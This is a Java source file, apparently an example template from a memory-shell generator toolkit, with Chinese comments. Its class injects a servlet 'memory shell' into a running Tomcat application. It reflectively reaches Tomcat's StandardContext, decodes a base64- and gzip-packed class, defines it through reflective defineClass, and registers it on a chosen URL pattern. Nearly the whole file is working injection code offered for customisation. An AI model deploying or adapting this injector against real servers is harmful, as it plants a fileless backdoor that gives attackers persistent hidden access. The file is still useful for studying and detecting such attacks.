package com.reajason.javaweb.examples.customgui.server;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

/**
 * Servlet 注入器模板（应用内注入版），与 {@link DemoFilterInjector} 同一套思路：
 * TCCL → {@code resources → context} 找到 {@code StandardContext}，然后走
 * {@code addChild(StandardWrapper)} + {@code addServletMappingDecoded} 注册。
 *
 * <p>Servlet 内存马由注入器注册到 {@code urlPattern} 上，只在那个路径可见。
 * 辅助方法（base64 / gzip / 反射 / 报错）必须复制进模板 —— 见
 * {@link DemoFilterInjector} 关于"模板必须自包含"与"注册为什么不能只用公有 API"的说明。
 *
 * @author ReaJason
 */
public class DemoServletInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public DemoServletInjector() {
        if (ok) {
            return;
        }
        try {
            Object context = findStandardContext();
            ClassLoader appClassLoader = Thread.currentThread().getContextClassLoader();
            Class<?> shellClass = defineShell(appClassLoader);
            inject(context, shellClass);
            msg += "servlet [" + getUrlPattern() + "] ready\n";
        } catch (Throwable e) {
            msg += "inject failed: " + getErrorMessage(e);
        }
        ok = true;
        System.out.println(msg);
    }

    /**
     * 应用内找 StandardContext：TCCL 就是 webapp ClassLoader（Tomcat 的
     * WebappClassLoaderBase 一族），两步反射拿到。
     */
    private Object findStandardContext() throws Exception {
        ClassLoader appClassLoader = Thread.currentThread().getContextClassLoader();
        Object resources = getFieldValue(appClassLoader, "resources");
        return findMethod(resources.getClass(), "getContext").invoke(resources);
    }

    /**
     * 把内存马字节定义进 webapp ClassLoader（注入器在应用内执行，TCCL 就是它）。
     */
    private Class<?> defineShell(ClassLoader appClassLoader) throws Exception {
        byte[] shellBytes = gzipDecompress(decodeBase64(getBase64String()));
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        return (Class<?>) defineClass.invoke(appClassLoader, shellBytes, 0, shellBytes.length);
    }

    /**
     * 注册：与内置 TomcatServletInjector 相同的序列 —— createWrapper、塞入 shell 实例、
     * addChild 挂进 StandardContext，再补一条 servlet 映射。Tomcat 类全部通过
     * context classloader 反射加载，编译期不依赖它们。
     */
    @SuppressWarnings("all")
    private void inject(Object context, Class<?> shellClass) throws Exception {
        if (invokeMethod(context, "findServletMapping", new Class[]{String.class}, new Object[]{getUrlPattern()}) != null) {
            return;
        }
        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        Class<?> containerClass = contextClassLoader.loadClass("org.apache.catalina.Container");

        Object wrapper = invokeMethod(context, "createWrapper", null, null);
        invokeMethod(wrapper, "setName", new Class[]{String.class}, new Object[]{getClassName()});
        invokeMethod(wrapper, "setLoadOnStartup", new Class[]{Integer.TYPE}, new Object[]{1});
        setFieldValue(wrapper, "instance", shellClass.newInstance());
        invokeMethod(wrapper, "setServletClass", new Class[]{String.class}, new Object[]{getClassName()});
        invokeMethod(context, "addChild", new Class[]{containerClass}, new Object[]{wrapper});

        try {
            invokeMethod(context, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{getUrlPattern(), getClassName()});
        } catch (Exception e) {
            invokeMethod(context, "addServletMappingDecoded", new Class[]{String.class, String.class, Boolean.TYPE}, new Object[]{getUrlPattern(), getClassName(), false});
        }
    }

    private static Field getField(Object obj, String name) throws NoSuchFieldException {
        for (Class<?> clazz = obj.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException ignored) {
                // 字段可能声明在父类上（如 WebappClassLoaderBase.resources）
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    private static Object getFieldValue(Object obj, String name) throws Exception {
        return getField(obj, name).get(obj);
    }

    private static void setFieldValue(Object obj, String name, Object value) throws Exception {
        getField(obj, name).set(obj, value);
    }

    private static Method findMethod(Class<?> clazz, String name) {
        Method found = null;
        while (clazz != null && found == null) {
            try {
                found = clazz.getDeclaredMethod(name);
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (found != null) {
            found.setAccessible(true);
        }
        return found;
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
